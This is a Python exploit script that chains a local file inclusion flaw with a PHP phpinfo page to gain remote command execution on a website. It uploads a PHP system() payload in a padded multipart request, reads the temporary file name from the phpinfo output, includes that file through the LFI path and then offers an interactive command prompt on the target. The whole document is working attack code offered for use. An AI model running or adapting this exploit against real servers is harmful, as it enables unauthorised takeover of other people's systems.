#!/usr/bin/python
# LFI: PHPinfo to RCE exploit
# Author: D35m0nd142
# This is an improved remake of the original (perl) script written by Pashkela
# The exploit assumes that the path to the phpinfo file you provided is correct. If it is not, it will not work.
# Enter the website in this way: website /path.. you MUST NOT fill the gap between first and second string
import socket
import requests
import os,sys,time
import re

# GLOBAL SETTINGS
########################################################
rcvbuf = 1024
bigz = 3000
junkheaders = 30
junkfiles = 40
junkfilename = '>' * 100000
########################################################

#######INIT
host = ""
path = ""
###########

def request(headers,cmd,path1,path,test):
    z = "Z" * bigz
    found = 0
    headers = """POST %s HTTP/1.0\nHost: %s\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0b8) Gecko/20100101 Firefox/4.0b8\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-us,en;q=0.5\nAccept-Charset: windows-1251,utf-8;q=0.7,*;q=0.7\nz:%s\n""" %(path,host,z)
    
    loop = range(0,junkheaders)
    for count in loop:
        headers = headers+"z%d: %d\n" %(count,count)
    
    #print "\n%s\n" %headers
    headers += """Content-Type: multipart/form-data; boundary=---------------------------59502863519624080131137623865\nContent-Length: """
    
    content = """-----------------------------59502863519624080131137623865\nContent-Disposition: form-data; name="tfile"; filename="test.html"\nContent-Type: text/html\n\n<?php system('echo AbracadabrA && %s'); ?>\n-----------------------------59502863519624080131137623865--""" %(cmd)
    
    loop = range(0,junkfiles)
    for count in loop:
        content = content + """-----------------------------59502863519624080131137623865\nContent-Disposition: form-data; name="ffile%d"; filename="%d%s"\nContent-Type: text/html\n\nno\n-----------------------------59502863519624080131137623865--\n""" %(count,count,junkfilename)
    
    headers = headers+str(len(content))+"\n\n%s" %(content)
    
    #print "[headers ready]"
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    #sys.stdout.write("[*] Sending request\t\t")
    sock.connect((host,80))
    #print "\n%s\n" %headers
    sock.send(headers)
    #print"[request sent]\n"
    all_data = ""
    running = 1
    while "tmp_name" not in all_data:
        #sys.stdout.write('.')
        data = sock.recv(1024) # read 1024 byte chunks
        all_data = all_data + data
        
        if("tmp_name" in all_data and "/tmp/php" in all_data):
            found = 1
            #sys.stdout.write("\n[+] Got filename: ")
            fil = open("out.txt","w")
            fil.write(all_data)
            fil.close()
            
            for line in open("out.txt"):
                if "tmp_name]" in line:
                    #print line
                    mystr = str(line)
                    array = mystr.split()
                    tmp_name = array[2]
                    #print "%s" %tmp_name
                    break
        
            tmp_url = "http://%s%s%s" %(host,path1,tmp_name)
            #print "%s" %tmp_url
            r = requests.get(tmp_url)
            content = r.content
            #print "%s\n" %content
            ofile = open("out.txt","w")
            ofile.write(content)
            ofile.close()
            os.system("./phpinfo_ext")
            #print "%s\n" %content
            break
        
        if("PHP License" in all_data):
            break
    
    sock.close()
    if (found == 1):
        return 1
    else:
        return 0

try:
    if("php" in sys.argv[2]):
        host = sys.argv[1]
        path = sys.argv[2]
    else:
        print "[!] Can't extract host!\n"
        sys.exit(1)
except:
    print "[!] You have not inserted any website to attack (maybe you forgot the path?) !\n"
    sys.exit(1)

path1 = raw_input("[*] Enter the vulnerable LFI path (ex: /lfi.php?file=../.. ) -> ")
headers = ""
cmd = "id"
sys.stdout.write("\n[*] Generating the request.. wait please..\n")
found = request(headers,cmd,path1,path,1)


if(found == 1):
    print "\n[*] Opening a SYSTEM shell ..."
    time.sleep(1)
    cmd = "nope"
    while(cmd != "exit" and cmd != "quit"):
        cmd = raw_input("\n$> ")
        request(headers,cmd,path1,path,0)

    print "\n"

else:
    print "[!] The website is not vulnerable to this inclusion attack!\n"
    sys.exit(1)



